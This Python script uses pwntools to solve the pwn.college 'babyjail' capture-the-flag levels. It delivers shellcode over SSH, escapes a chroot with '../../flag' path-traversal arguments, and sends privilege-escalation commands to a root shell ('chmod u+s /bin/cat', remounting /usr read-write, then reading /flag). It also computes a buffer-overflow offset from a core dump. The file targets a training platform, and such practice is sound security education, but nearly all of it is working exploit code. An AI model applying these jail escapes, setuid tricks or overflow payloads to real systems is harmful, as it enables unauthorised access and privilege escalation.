import pwn
import sys

from pwnlib.elf.corefile import CorefileFinder

pwn.context.log_level = 'debug'
pwn.context.terminal = ['kitty']
pwn.context.rename_corefiles = False
pwn.context.delete_corefiles = True

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/babyjail_level{self.level}"
        self.local_process = f"binaries/babyjail_level{self.level}"
        self.func_name = f"level{self.level}"
        self.run = globals()[self.func_name]

def level1(level, r):
    pwn.context.binary = pwn.ELF(level.local_process)

    r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
    p = r.process([level.remote_process, '../../flag'])
    p.recvuntil(b"stdout.\n")
    print(p.recvall().decode())

def level2(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl2.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level3(level, p):
    level2(level, p)

def level4(level, p):
    level2(level, p)

def level5(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl5.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level6(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl6.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level7(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl7.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level8(level, p):
    # Open a file descriptor @ 3 - use that for openat
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl8.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level13(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl13.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n")
    print(p.recvall().decode())

def level14(level, p):
    p.recvuntil(b"bash-5.0# ")
    p.sendline(b"cat /old/flag")
    print(p.recvline().decode())

def level15(level, p):
    p.sendlineafter(b"bash-5.0# ", b"chmod u+s /bin/cat")
    p.sendlineafter(b"bash-5.0# ", b"exit")
    p.sendlineafter(b"~$ ", b"/usr/bin/cat /flag")
    print(p.recvline().decode())

def level16(level, p):
    p.sendlineafter(b"bash-5.0# ", b"mount -o remount,rw /usr")
    p.sendlineafter(b"bash-5.0# ", b"chmod u+s /bin/cat")
    p.sendlineafter(b"bash-5.0# ", b"exit")
    p.sendlineafter(b"~$ ", b"/usr/bin/cat /flag")
    print(p.recvline().decode())

def level17(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl2.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n\n")
    print(p.recvline().decode())
    p.close()

def level18(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)
    shellcode = get_shellcode('shellcode/lvl18.s')

    p.sendafter(b"stdin.\n", shellcode)
    p.recvuntil(b"shellcode!\n\n")
    print(p.recvline().decode())
    p.close()


def get_payload(level):
    p = pwn.process(level.local_process)
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    payload = pwn.cyclic(256)
    p.sendlineafter(b"input\n", payload)
    print(p.recvline().decode())
    p.wait_for_close()

    c = CorefileFinder(p)
    core = pwn.Coredump(c.systemd_coredump_corefile())

    print(f"RSP: {hex(core.rsp)}")
    stack_data = core.read(core.rsp, 8)
    print(f"Data: {stack_data.hex()}")
    assert stack_data in payload
    payload = pwn.fit({
        pwn.cyclic_find(stack_data): elf.symbols.read_flag
    })

    return payload

def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

def get_shellcode(asm_file):
    assembly = []
    with open(asm_file, 'r') as f:
        for line in f.readlines():
            assembly.append(line.split('#')[0].rstrip())

    return pwn.asm('\n'.join(assembly))

def print_shellcode(shellcode):
    output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(output)

if __name__ == '__main__':
    if len(sys.argv) == 3 and sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        p = pwn.process([level.local_process, "../../"], aslr=False, close_fds=False)

    elif len(sys.argv) >= 4 and sys.argv[1] == 'dbg':
        level = Level(sys.argv[2])
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        p = pwn.gdb.debug([level.local_process, "../../../../../../../../"], gdbscript=gdbscript, stdin=pwn.PTY, stdout=pwn.PTY, aslr=False)

    elif sys.argv[1] == 'remote':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        if int(level.level) < 13:
            p = r.process([level.remote_process, "../../"])
        elif int(level.level) < 17:
            p = r.process(["vm", "connect"])
            p.sendlineafter(b"~$ ", level.remote_process.encode())
        elif int(level.level) == 17:
            p = r.process(["vm", "connect"])
            p.sendlineafter(b"~$ ", level.remote_process.encode() + b" ../../")
        elif int(level.level) == 18:
            p = r.process(["vm", "connect"])
            p.sendlineafter(b"~$ ", level.remote_process.encode() + b" /proc/181/ns")

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    with p:
        level.run(level, p)

